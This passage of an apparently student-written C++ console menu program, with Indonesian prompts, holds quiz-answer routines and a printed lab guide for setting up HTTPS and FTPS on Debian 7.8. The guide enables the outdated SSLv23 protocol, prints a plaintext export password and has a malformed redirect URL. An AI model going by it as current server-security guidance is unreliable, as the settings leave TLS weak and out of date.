							scanf("%d",&kend);
							printf("Lama Parkir = ");scanf("%d",&lp);
							if(kend==1)//motor
							{
								if(lp<=3)bayar=2000;
								else if(lp<=8)bayar=5000;
								else bayar=12000;
							}
							else
							{
								if(lp<=3)bayar=5000;
								else if(lp<=8)bayar=10000;
								else bayar=20000;
							}
							printf("Biaya Parkir Rp. %d\n",bayar);
							break;
				case '3' :  printf("Jumlah bilangan yang akan diinput = ");
							scanf("%d",&jb);
							for(i=1;i<=jb;i++)
							{
								scanf("%d",&bil);
								switch(bil%2)
								{
									case 1 : jgl++;break;
									case 0 : jgn++;break;
								}
							}
							printf("Jumlah Bilangan Genap  = %d\n",jgn);
							printf("Jumlah Bilangan Ganjil = %d\n",jgl);
							break;
			}//end switch
			fflush(stdin);
			printf("\nMau coba lagi ? ");scanf("%c",&jawab);
		}while(toupper(jawab)=='Y');
	}
	*/
	program_combine_3_kasus:system("cls");string pilihan;
	int i,jgn=0,jgl=0,a,b,bjb,bil,jb,kend,lp,bayar;
	char pilih,jawab;
	do
	{
		system("cls");
		puts("Jawaban QUIZ");
		puts("1.Jawaban no.1");
		puts("2.Jawaban no.2");
		puts("3.Jawaban no.3");
		printf("Pilih 1/2/3 = ");pilih=getche();printf("\n");
		switch(pilih)
		{
			case '1' :	printf("Masukkan 2 Buah Bilangan = ");
						scanf("%d %d",&a,&b);
						printf("Hasilnya adalah %d %d %d %.2f",a+b,a-b,a*b,(float)a/b);
						break;
			case '2' :  printf("Jenis kendaraan 1.motor 2.mobil = ");
						scanf("%d",&kend);
						printf("Lama Parkir = ");scanf("%d",&lp);
						if(kend==1)//motor
						{
							if(lp<=3)bayar=2000;
							else if(lp<=8)bayar=5000;
							else bayar=12000;
						}
						else
						{
							if(lp<=3)bayar=5000;
							else if(lp<=8)bayar=10000;
							else bayar=20000;
						}
						printf("Biaya Parkir Rp. %d\n",bayar);
						break;
			case '3' :  printf("Jumlah bilangan yang akan diinput = ");
						scanf("%d",&jb);
						for(i=1;i<=jb;i++)
						{
							scanf("%d",&bil);
							switch(bil%2)
							{
								case 1 : jgl++;break;
								case 0 : jgn++;break;
							}
						}
						printf("Jumlah Bilangan Genap  = %d\n",jgn);
						printf("Jumlah Bilangan Ganjil = %d\n",jgl);
						break;
		}//end switch
		fflush(stdin);
		printf("\nMau coba lagi ? ");scanf("%c",&jawab);
	}while(toupper(jawab)=='Y');
	cout << endl;
	cout << endl;choosing_in_program_combine_3_kasus:
	cout << "Jalankan kembali Program ini [JKPI] / Lihat List di Program Dasar [PROKAS] / Go Home [GOHOME] : ";cin>>pilihan;
	if(pilihan == "JKPI"){system("cls");goto program_combine_3_kasus;}
	else if(pilihan == "PROKAS"){system("cls");program_aplikasi();}
	else if(pilihan == "GOHOME"){system("cls");main_program();}
	else{goto choosing_in_program_combine_3_kasus;}return 0;
}
int chivset()
{
	chivset:system("cls");string pilihan;
	cout << "\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2" << endl;
	cout << "Home >> Chivset" << endl;
	cout << "\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2" << endl;
    cout << "Welcome to My Program" << endl;
	cout << "Choose the program" << endl;
	cout << "1. Syntax Konfigurasi HTTPS dan FTPS Debian 7.8" << endl;
	cout << endl;
	cout << "Masukkan Pilihan [MAPI] / Go Home [GOHOME] : ";cin>>pilihan;
	if(pilihan == "MAPI")
    {
        int pilihan;cout << endl;choosing_in_mapi:
        cout << "Masukkan Pilihan : ";cin>>pilihan;
        if(pilihan == 1)
        {
            system("cls");int pilihan;
            cout << "\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2" << endl;
            cout << "Home >> Chivset >> Syntax Konfigurasi HTTPS dan FTPS Debian 7.8" << endl;
            cout << "\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2" << endl;
            cout << endl;cout << endl;syntax_konfigurasi_https_dan_ftps_debian_7_8();cout << endl;cout << endl;
        }
        else{goto choosing_in_mapi;}
    }
    else if(pilihan == "GOHOME"){system("cls");main_program();}
    else{goto chivset;}
    return 0;
}
int syntax_konfigurasi_https_dan_ftps_debian_7_8()
{
	cout << "Syntax Konfigurasi HTTPS dan FTPS Debian 7.8" << endl;
	cout << endl;
	cout << "**********************************************************************" << endl;
	cout << "**********************************************************************" << endl;
	cout << "Syntax Konfigurasi HTTPS" << endl;
	cout << "**********************************************************************" << endl;
	cout << "**********************************************************************" << endl;
	cout << endl;
	cout << "----------------------------------------------------------------------------------------------------------------------------" << endl;
	cout << "apt-get install apache2 openssl ssl-cert" << endl;
	cout << "----------------------------------------------------------------------------------------------------------------------------" << endl;
	cout << "mkdir /cert" << endl;
	cout << "----------------------------------------------------------------------------------------------------------------------------" << endl;
	cout << "cd /cert | ls" << endl;
	cout << "----------------------------------------------------------------------------------------------------------------------------" << endl;
	cout << "cp /etc/ssl/openssl.cnf /cert/ | ls" << endl;
	cout << "----------------------------------------------------------------------------------------------------------------------------" << endl;
	cout << "nano openssl.cnf [dir cert]" << endl;
	cout << "----------------------------------------------------------------------------------------------------------------------------" << endl;
	cout << "search :" << endl;
	cout << "default_md = default ---> default_md = sha256" << endl;
	cout << "policy     = policy_match ---> policy = policy_anything" << endl;
	cout << endl;
	cout << "# For the CA policy" << endl;
	cout << "[ policy_match ]" << endl;
	cout << "countryName            = match ---> optional" << endl;
	cout << "stateOrProvinceName    = match ---> optional" << endl;
	cout << "organizationName       = match ---> optional" << endl;
	cout << "organizationalUnitName = optional" << endl;
	cout << "commonName             = supplied" << endl;
	cout << "emailAddress           = optional" << endl;
	cout << endl;
	cout << "##################################################" << endl;
	cout << "[ req ]" << endl;
	cout << "default_bits           = 2048 ---> 4096" << endl;
	cout << "default_keyfile        = privkey.pem" << endl;
	cout << "distinguished_name     = req_distinguished_name" << endl;
	cout << "req_extensions         = v3_req" << endl;
	cout << "attributes             = req_attributes" << endl;
	cout << "x509_extensions = v3_ca # The Extensions to add to the self signed cert" << endl;
	cout << endl;
	cout << "[ req_distinguished_name ]" << endl;
	cout << "countryName                                     = Country Name (2 letter code)" << endl;
	cout << "countryName_default                             = AU ---> ID" << endl;
	cout << "countryName_min                                 = 2" << endl;
	cout << "countryName_max                                 = 2" << endl;
	cout << endl;
	cout << "stateOrProvinceName                             = State or Province Name (full name)" << endl;
	cout << "stateOrProvinceName_default             		= Some-State ---> Jawa Barat" << endl;
	cout << endl;
	cout << "localityName                               	    = Locality Name (eg, city)" << endl;
	cout << endl;
	cout << "0.organizationName                              = Organization Name (eg, company)" << endl;
	cout << "0.organizationName_default              		= Internet Widgits Pty Ltd ---> SMKN 1 Katapang" << endl;
	cout << endl;
	cout << "[Ke arah paling bawah dari file openssl.cnf]" << endl;
	cout << endl;
	cout << "[ v3_req ]" << endl;
	cout << "basicConstraints = CA:FALSE" << endl;
	cout << "keyUsage = nonRepudiation,digitalSignature,keyEncipherment" << endl;
	cout << "subjectAltName = @alt_names" << endl;
	cout << "[alt_names]" << endl;
	cout << "DNS.1 = kelompok1.id" << endl;
	cout << "DNS.2 = *.kelompok1.id" << endl;
	cout << "IP.1 = 192.168.10.2" << endl;
	cout << endl;
	cout << "[save]" << endl;
	cout << "----------------------------------------------------------------------------------------------------------------------------" << endl;
	cout << "/cert# openssl genrsa -out ca.key 4096" << endl;
	cout << "----------------------------------------------------------------------------------------------------------------------------" << endl;
	cout << "/cert# ls | ca.key openssl.cnf" << endl;
	cout << "----------------------------------------------------------------------------------------------------------------------------" << endl;
	cout << "/cert# openssl req -new -x509 -days 365 -sha256 -config openssl.cnf -key ca.key -out ca.crt" << endl;
	cout << "----------------------------------------------------------------------------------------------------------------------------" << endl;
	cout << "Locality Name (eg, city) []:Bandung" << endl;
	cout << "Organizational Unit Name (eg, section) []:TKJ" << endl;
	cout << "Common Name (e.g. server FQDN or YOUR name) []: kelompok 1" << endl;
	cout << "Email Address []:admin@kelompok1.id" << endl;
	cout << "----------------------------------------------------------------------------------------------------------------------------" << endl;
	cout << "/cert# ls | ca.crt ca.key openssl.cnf" << endl;
	cout << "----------------------------------------------------------------------------------------------------------------------------" << endl;
	cout << "/cert# openssl genrsa -out kelompok1.id.key 4096" << endl;
	cout << "----------------------------------------------------------------------------------------------------------------------------" << endl;
	cout << "/cert# openssl req -new -sha256 -config openssl.cnf -key kelompok1.id.key -out kelompok1.id.csr" << endl;
	cout << "----------------------------------------------------------------------------------------------------------------------------" << endl;
	cout << "Locality Name (eg, city) []:Bandung" << endl;
	cout << "Organizational Unit Name (eg, section) []:TKJ" << endl;
	cout << "Common Name (e.g. server FQDN or YOUR name) []: kelompok1.id" << endl;
	cout << "Email Address []:admin@kelompok1.id" << endl;
	cout << endl;
	cout << "A challenge password []: [enter]" << endl;
	cout << "An optional company name []: [enter]" << endl;
	cout << "----------------------------------------------------------------------------------------------------------------------------" << endl;
	cout << "/cert# ls | ca.crt ca.key kelompok1.id.csr kelompok1.id.key openssl.cnf" << endl;
	cout << "---------------------------------------------------------------------------------------------------------------------------------------------------------------------------" << endl;
	cout << "/cert# openssl x509 -req -days 365 -sha256 -in kelompok1.id.csr -CA ca.crt -CAkey ca.key -set_serial 01 -out kelompok1.id.crt -extensions v3_req -extfile openssl.cnf" << endl;
	cout << "---------------------------------------------------------------------------------------------------------------------------------------------------------------------------" << endl;
	cout << "/cert# openssl pkcs12 -export -sha256 -in kelompok1.id.crt -inkey kelompok1.id.key -out kelompok1.id.p12" << endl;
	cout << "----------------------------------------------------------------------------------------------------------------------------" << endl;
	cout << "/cert# openssl pkcs12 -export -in kelompok1.id.crt -inkey kelompok1.id.key -out kelompok1.id.p12" << endl;
	cout << "----------------------------------------------------------------------------------------------------------------------------" << endl;
	cout << "Enter Export Password : TKJ2017" << endl;
	cout << "----------------------------------------------------------------------------------------------------------------------------" << endl;
	cout << "/cert# ls | ca.crt ca.key kelompok1.id.crt kelompok1.id.csr kelompok1.id.key kelompok1.id.p12 openssl.cnf" << endl;
	cout << "----------------------------------------------------------------------------------------------------------------------------" << endl;
	cout << "nano /etc/apache2/sites-available/default" << endl;
	cout << "----------------------------------------------------------------------------------------------------------------------------" << endl;
	cout << "ServerName www.kelompok1.id" << endl;
	cout << "Redirect / https://www,kelompok1.id" << endl;
	cout << endl;
	cout << "----------------------------------------------------------------------------------------------------------------------------" << endl;
	cout << "/etc/apache2/sites-available# cp default https" << endl;
	cout << "----------------------------------------------------------------------------------------------------------------------------" << endl;
	cout << "/etc/apache2/sites-available# nano https" << endl;
	cout << "----------------------------------------------------------------------------------------------------------------------------" << endl;
	cout << "<VirtualHost *:443>" << endl;
	cout << "	ServerAdmin webmaster@kelompok1.id" << endl;
	cout << "	ServerName www.kelompok1.id" << endl;
	cout << endl;
	cout << "	SSLEngine On" << endl;
	cout << "	SSLCertificateFile /cert/kelompok1.id.crt" << endl;
	cout << "	SSLCertificateKeyFile /cert/kelompok1.id.key" << endl;
	cout << endl;
	cout << "----------------------------------------------------------------------------------------------------------------------------" << endl;
	cout << "/etc/apache2/sites-available# a2ensite https" << endl;
	cout << "----------------------------------------------------------------------------------------------------------------------------" << endl;
	cout << "/etc/apache2/sites-available# a2enmod ssl" << endl;
	cout << "----------------------------------------------------------------------------------------------------------------------------" << endl;
	cout << "/etc/apache2# nano ports.conf" << endl;
	cout << "----------------------------------------------------------------------------------------------------------------------------" << endl;
	cout << "NameVirtualHost *:80" << endl;
	cout << "NameVirtualHost *:443" << endl;
	cout << "Listen 80" << endl;
	cout << endl;
	cout << "[save]" << endl;
	cout << "----------------------------------------------------------------------------------------------------------------------------" << endl;
	cout << "service apache2 restart" << endl;
	cout << "----------------------------------------------------------------------------------------------------------------------------" << endl;
	cout << "Buka Google --> Settings --> Manage Certificates" << endl;
	cout << endl;
	cout << "Trusted Root Certification Authorities --> Import ca.crt" << endl;
	cout << endl;
	cout << "Personal --> Import kelompok1.id.p12 --> TKJ2017" << endl;
	cout << "----------------------------------------------------------------------------------------------------------------------------" << endl;
	cout << "https://www.kelompok1.id" << endl;
	cout << "----------------------------------------------------------------------------------------------------------------------------" << endl;
	cout << endl;
	cout << "**********************************************************************" << endl;
	cout << "**********************************************************************" << endl;
	cout << "Syntax Konfigurasi FTPS" << endl;
	cout << "**********************************************************************" << endl;
	cout << "**********************************************************************" << endl;
	cout << endl;
	cout << "----------------------------------------------------------------------------------------------------------------------------" << endl;
	cout << "apt-get install proftpd-basic -y" << endl;
	cout << "----------------------------------------------------------------------------------------------------------------------------" << endl;
	cout << "OK - Standalone" << endl;
	cout << "----------------------------------------------------------------------------------------------------------------------------" << endl;
	cout << "nano /etc/proftpd/proftpd.conf" << endl;
	cout << "----------------------------------------------------------------------------------------------------------------------------" << endl;
	cout << "Search :" << endl;
	cout << "ServerName  [Debian] ---> [ftp.kelompok1.id]" << endl;
	cout << "Hilangkan tanda [#] pada DefaultRoot" << endl;
	cout << "Port 21 menjadi 990" << endl;
	cout << "Hilangkan tanda [#] pada Include /etc/proftpd/tls.conf" << endl;
	cout << endl;
	cout << "[save]" << endl;
	cout << "----------------------------------------------------------------------------------------------------------------------------" << endl;
	cout << "nano /etc/proftpd/tls.conf" << endl;
	cout << "----------------------------------------------------------------------------------------------------------------------------" << endl;
	cout << "Hilangkan tanda [#] pada TLSEngine on" << endl;
	cout << "Hilangkan tanda [#] pada TLSLog /var/log/proftpd/tls.log" << endl;
	cout << "Hilangkan tanda [#] pada TLSProtocol SSLv23" << endl;
	cout << "Hilangkan tanda [#] pada TLSRSACertificateFile /etc/ssl/certs/proftpd.crt" << endl;
	cout << "Hilangkan tanda [#] pada TLSRSACertificateKeyFile /etc/ssl/private/proftpd.key" << endl;
	cout << "Ganti TLSRSACertificateFile /etc/ssl/certs/proftpd.crt        ---> TLSRSACertificateFile /cert/kelompok1.id.crt" << endl;
	cout << "Ganti TLSRSACertificateKeyFile /etc/ssl/private/proftpd.key   ---> TLSRSACertificateKeyFile /cert/kelompok1.id.key" << endl;
	cout << "Hilangkan tanda [#] pada TLSCACertificateFile /etc/ssl/certs/CA.pem" << endl;
	cout << "Ganti TLSCACertificateFile /etc/ssl/certs/CA.pem ---> TLSCACertificateFile /cert/ca.crt" << endl;
	cout << endl;
	cout << "Ada :" << endl;
	cout << "#TLSOptions NoCertRequest EnableDiags" << endl;
	cout << "#TLSOptions NoCertRequest EnableDiags NoSessionReuseRequired" << endl;
	cout << endl;
	cout << "Tambahkan di bawah nya :" << endl;
	cout << "TLSOptions NoCertRequest UseImplicitSSL NoSessionReuseRequired [tanpa #]" << endl;
	cout << endl;
	cout << "Hilangkan tanda [#] pada TLSVerifyClient off" << endl;
	cout << "Hilangkan tanda [#] pada TLSRequired on" << endl;
	cout << endl;
	cout << "[save]" << endl;
	cout << "----------------------------------------------------------------------------------------------------------------------------" << endl;
	cout << "nano /etc/proftpd/modules.conf" << endl;
	cout << "----------------------------------------------------------------------------------------------------------------------------" << endl;
	cout << "ke bagian paling bawah" << endl;
	cout << endl;
	cout << "Beri tanda [#] di depan tulisan LoadModule mod_tls_memcache.c" << endl;
	cout << "----------------------------------------------------------------------------------------------------------------------------" << endl;
	cout << "service proftpd restart" << endl;
	cout << "----------------------------------------------------------------------------------------------------------------------------" << endl;
	cout << "adduser kelompok1" << endl;
	cout << "----------------------------------------------------------------------------------------------------------------------------" << endl;
	cout << "Buka FileZilla --> Navigation bar [File] --> Site Manager" << endl;
	cout << endl;
	cout << "Masukkan User [kelompok1], Password, dan Port nya" << endl;
	cout << endl;
	cout << "Host ftp.kelompok1.id" << endl;
	cout << "Protocol ( FTP - File Transfer Protocol )" << endl;
	cout << "Encryption Require implicit FTP over TLS" << endl;
	cout << "Logon Type Normal" << endl;
	cout << endl;
	cout << "Connect" << endl;
	cout << endl;
	cout << "Abort previous connection and connect in current tab [OK]" << endl;
	cout << endl;
	cout << "Certificate in chain [0]" << endl;
	cout << endl;
	cout << "beri tanda ceklis pada checkbox [Always trust certificate in future sessions]" << endl;
	cout << endl;
	cout << "[OK]" << endl;
	cout << endl;
}
int game()
{
    game:system("cls");string pilihan;
	cout << "\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2" << endl;
	cout << "Home >> Game" << endl;
	cout << "\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2" << endl;
    cout << "Welcome to My Program" << endl;
	cout << "Choose the program" << endl;
	cout << "1. Snake Game" << endl;
	cout << "2. Race Game" << endl;
	cout << endl;
	cout << "Masukkan Pilihan [MAPI] / Go Home [GOHOME] : ";cin>>pilihan;
	if(pilihan == "MAPI")
    {
        int pilihan;cout << endl;choosing_in_mapi:
        cout << "Masukkan Pilihan : ";cin>>pilihan;
        if(pilihan == 1)
        {
            system("cls");int pilihan;
            cout << "\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2" << endl;
            cout << "Home >> Game >> Snake Game" << endl;
            cout << "\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2" << endl;
            cout << endl;cout << endl;snake_game();cout << endl;cout << endl;
        }
        else if(pilihan == 2)
        {
            system("cls");int pilihan;
            cout << "\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2" << endl;
            cout << "Home >> Game >> Race Game" << endl;
